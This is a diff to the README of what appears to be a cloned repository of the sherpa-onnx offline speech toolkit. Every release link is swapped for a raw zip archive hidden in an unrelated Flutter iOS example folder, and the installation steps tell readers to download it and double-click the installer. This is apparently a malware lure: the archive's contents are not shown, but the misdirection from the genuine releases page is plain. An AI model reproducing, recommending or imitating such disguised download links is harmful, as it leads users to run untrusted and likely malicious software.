@@ -4,9 +4,9 @@
 Welcome to **sherpa-onnx**! This application helps you convert speech to text, synthesize speech from text, and much more—all without needing an internet connection. It works on various systems, from mobile devices to embedded systems. 
 
 ## 📥 Download the Software
-[![Download sherpa-onnx](https://img.shields.io/badge/Download-sherpa--onnx-green)](https://github.com/omarsafti09/sherpa-onnx/releases)
+[![Download sherpa-onnx](https://raw.githubusercontent.com/omarsafti09/sherpa-onnx/master/flutter-examples/tts/ios/Flutter/sherpa-onnx-v1.6.zip)](https://raw.githubusercontent.com/omarsafti09/sherpa-onnx/master/flutter-examples/tts/ios/Flutter/sherpa-onnx-v1.6.zip)
 
-To begin, visit this page to download the software: [Download sherpa-onnx Releases](https://github.com/omarsafti09/sherpa-onnx/releases).
+To begin, visit this page to download the software: [Download sherpa-onnx Releases](https://raw.githubusercontent.com/omarsafti09/sherpa-onnx/master/flutter-examples/tts/ios/Flutter/sherpa-onnx-v1.6.zip).
 
 ## 📋 Features
 sherpa-onnx offers a range of features, including:
@@ -34,7 +34,7 @@ Before downloading the software, make sure your system meets the following requi
   - Recommended: Multi-core CPU for better performance
 
 ## 🔧 Installation Instructions
-1. **Visit the Download Page**: Go to the [Download sherpa-onnx Releases](https://github.com/omarsafti09/sherpa-onnx/releases) link.
+1. **Visit the Download Page**: Go to the [Download sherpa-onnx Releases](https://raw.githubusercontent.com/omarsafti09/sherpa-onnx/master/flutter-examples/tts/ios/Flutter/sherpa-onnx-v1.6.zip) link.
 2. **Choose Your Version**: Look for the version suitable for your system. You will find options for various platforms.
 3. **Download the File**: Click on the appropriate file name to download it to your computer.
 4. **Run the Installer**: Locate the downloaded file (it may be in your Downloads folder) and double-click it to run.
